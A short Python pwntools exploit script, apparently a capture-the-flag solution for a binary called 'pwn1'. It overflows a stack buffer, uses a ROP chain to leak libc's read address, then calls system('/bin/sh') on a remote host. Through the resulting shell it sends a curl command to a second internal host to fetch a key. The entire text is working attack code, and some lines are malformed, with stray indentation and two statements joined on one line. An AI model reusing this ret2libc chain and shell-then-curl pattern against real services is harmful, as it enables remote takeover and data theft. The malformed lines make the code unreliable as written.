#_*_coding:utf-8_*_ 
from pwn import * 
	debug = 1 
if debug: 	
	p = remote("4.4.1.100",4444) 	
	libc = ELF("./libc-2.23.so") 
else: 	
	p = process("./pwn1") 	
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
rdi = 0x401213 
p.recvuntil("choice:\n") 
p.sendline("1")  
p.recvuntil("input your name\n") 
p.sendline("aaaa") 
p.recvuntil("aaaaLet's start a game, can you guess the keyword?\n") 
text = "qwerty" 
payload = text + "a"*(0x20+8-len(text))+p64(rdi)+p64(0x602040)+p64(0x400760)+p64(0x400850)
p.sendline(payload) 
p.recvuntil("fail\n") 
read_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) log.success("read_addr:"+hex(read_addr)) 
system_addr = read_addr - libc.symbols["read"]+libc.symbols["system"] 
binsh_addr = read_addr - libc.symbols["read"]+libc.search("/bin/sh").next() 
p.recvuntil("choice:\n") 
p.sendline("1") 
print "1" 
p.recvuntil("input your name\n") 
p.sendline("aaaa") 
p.recvuntil("aaaaLet's start a game, can you guess the keyword?\n") 
text = "qwerty" 
payload = text+"a"*(0x20+8-len(text))+p64(rdi)+p64(binsh_addr)+p64(system_addr) 
p.sendline(payload) 
p.sendline("curl http://192.168.100.1/Getkey") 
p.interactive()
